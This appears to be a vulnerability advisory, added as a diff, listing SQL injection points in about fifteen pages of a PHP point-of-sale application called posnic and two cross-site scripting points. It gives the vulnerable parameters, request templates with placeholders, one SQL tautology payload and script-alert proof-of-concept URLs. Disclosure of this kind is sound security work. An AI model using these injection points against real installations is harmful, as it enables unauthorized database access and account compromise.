@@ -1,0 +1,125 @@
+========================
+SQL Injection
+========================
+
+
+http://www.example.com/posnic/change_password.php
+
+parameter : old_pass
+post data : 
+change_pass=Save&confirm_pass=acUn3t1x&new_pass=acUn3t1x&old_pass=1{SQL_HERE}
+
+Found on
+
+http://www.example.com/posnic/forget_pass.php
+
+parameter : name
+Payload : 1. or 1 = .1
+
+Found on
+
+http://www.example.com/posnic/update_sales.php
+
+parameter : sid
+
+http://www.example.com/posnic/update_sales.php?sid=22{SQL_HERE}&table=stock_sales&return=view_sales.php
+
+Found on
+
+http://www.example.com/posnic/update_customer_details.php
+
+parameter : sid
+
+http://www.example.com/posnic/update_customer_details.php?sid=9{SQL_HERE}&table=customer_details&return=view_customers.php
+
+Found on
+
+http://www.example.com/posnic/update_purchase.php
+
+parameter : sid
+
+http://www.example.com/posnic/update_purchase.php?sid=SD263{SQL_HERE}&table=stock_entries&return=view_purchase.php
+
+Found on
+
+http://www.example.com/posnic/update_supplier.php
+
+parameter : sid
+
+http://www.example.com/posnic/update_supplier.php?sid=38{SQL_HERE}&table=supplier_details&return=view_supplier.php
+
+Found on
+
+http://www.example.com/posnic/update_stock.php
+
+parameter : sid
+
+http://www.example.com/posnic/update_stock.php?sid=35{SQL_HERE}&table=stock_details&return=view_product.php
+
+Found on
+
+http://www.example.com/posnic/update_payment.php
+
+parameter : sid
+
+http://www.example.com/posnic/update_payment.php?sid=SD266{SQL_HERE}&table=stock_entries&return=view_payments.php
+
+Found on
+
+http://www.example.com/posnic/view_sales.php
+
+parameter : searchtxt
+post data : searchtxt=12{SQL_HERE}&Search=Search
+
+Found on
+
+http://www.example.com/posnic/view_customers.php
+
+parameter : searchtxt
+post data : searchtxt=12{SQL_HERE}&Search=Search
+
+Found on
+
+http://www.example.com/posnic/view_purchase.php
+
+parameter : searchtxt
+post data : searchtxt=12{SQL_HERE}&Search=Search
+
+Found on
+
+http://www.example.com/posnic/view_supplier.php
+
+parameter : searchtxt
+post data : searchtxt=12{SQL_HERE}&Search=Search
+
+Found on
+
+http://www.example.com/posnic/view_product.php
+
+parameter : searchtxt
+post data : searchtxt=12{SQL_HERE}&Search=Search
+
+Found on
+
+http://www.example.com/posnic/view_payments.php
+
+parameter : searchtxt
+post data : searchtxt=12{SQL_HERE}&Search=Search
+
+========================
+Cross Site Scripting
+========================
+
+http://www.example.com/posnic/forget_pass.php
+
+parameter : msg
+Ex : 
+http://www.example.com/posnic/forget_pass.php?msg=%3Cscript%3Ealert%28%27xss%27%29%3C/script%3E
+
+Found On
+
+http://www.example.com/posnic/index.php
+
+parameter : msg
+
+http://www.example.com/posnic/index.php?msg=%3Cscript%3Ealert%28%27xss%27%29%3C/script%3E&type=error
